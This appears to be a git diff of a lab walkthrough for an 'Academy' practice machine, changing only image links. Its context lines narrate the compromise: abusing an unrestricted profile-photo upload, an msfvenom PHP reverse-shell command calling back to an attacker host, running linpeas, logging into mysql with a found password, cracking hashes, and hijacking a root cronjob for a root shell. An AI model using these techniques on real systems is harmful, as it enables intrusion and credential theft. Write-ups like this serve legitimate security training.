@@ -161,15 +161,15 @@ Task Completed
 
 Credentials don’t work for phpmyadmin login. Browse to 192.168.56.104/academy based on note info. Find student login.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/9dd06479-4067-4d69-979a-660f8ec5cfd2/image.png)
+![image.png](images/image2.png)
 
 Can upload new profile photo and it seems to allow any file type:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/61bb91b2-0030-4f13-9c93-a7f96a10a068/image.png)
+![image.png](images/image3.png)
 
 And can browse to uploaded file:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/186bc7f7-23a8-45d3-9bd9-c897cbd4fd59/image.png)
+![image.png](images/image4.png)
 
 I generated a php reverse shell file with this command:
 
@@ -179,7 +179,7 @@ $ msfvenom -p php/reverse_php LHOST=192.168.56.102 LPORT=6000 -f raw > payload.p
 
 Then uploaded it and refreshed the page to get a nc connection.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/92c17861-8862-4d1b-8791-af0a37aa2fef/image.png)
+![image.png](images/image5.png)
 
 /etc/passwd shows the users on the machine
 
@@ -218,11 +218,11 @@ grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash
 
 I could also upload [linpeas.sh](http://linpeas.sh) through the upload function. After running, it found a mysql password:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/43151b04-d38d-4102-9a90-80a412a16f8a/image.png)
+![image.png](images/image6.png)
 
 I’ll try logging into the server via SSH with this password and user grimmie
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/5a4d09fa-b6ad-4ec1-825e-7a18b2f6b7df/image.png)
+![image.png](images/image7.png)
 
 I decided to connect to the mysql database with this command (no space between -p and the password is intentional):
 
@@ -230,11 +230,11 @@ I decided to connect to the mysql database with this command (no space between -
 mysql -u grimmie -pMy_V3ryS3cur3_P4ss -h localhost onlinecourse 
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/5fa1c183-547b-40ac-9da5-4b103a205013/image.png)
+![image.png](images/image8.png)
 
 Admin password found for web app:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/4e85d35d-f843-4ec7-a4eb-ebfd14deb7e1/image.png)
+![image.png](images/image9.png)
 
 admin:21232f297a57a5a743894a0e4a801fc3
 
@@ -244,19 +244,19 @@ So admin creds are admin:admin.
 
 Admin on web app:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/630cae73-bf50-4f5f-ba6b-929627aed7f7/image.png)
+![image.png](images/image10.png)
 
 And I just realized I could access the mysql database through the web app with the creds found earlier:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/49a52304-4d74-4c86-b1c9-99c072f2ee21/image.png)
+![image.png](images/image11.png)
 
 And found the root user password in the user db:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/0af1d7b3-e735-4301-a287-8ed4ba557d40/image.png)
+![image.png](images/image12.png)
 
 And cracked the hash:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/828b942e-db32-4d24-9b4e-c718d2d8ee83/image.png)
+![image.png](images/image13.png)
 
 root:26021997
 
@@ -264,12 +264,12 @@ However, ssh isn’t working with these credentials. Will try another avenue.
 
 Found file running as root cronjob
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/bba9765f-5dfe-4bbe-8dcb-480bd0f1b705/image.png)
+![image.png](images/image14.png)
 
 Edited file to give reverse shell:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/3d7ff075-07d1-4224-9f59-a57f2c0dc76d/image.png)
+![image.png](images/image15.png)
 
 And got root shell:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/024ebeea-a148-4429-aa0c-0035e0cc737e/image.png)
+![image.png](images/image16.png)
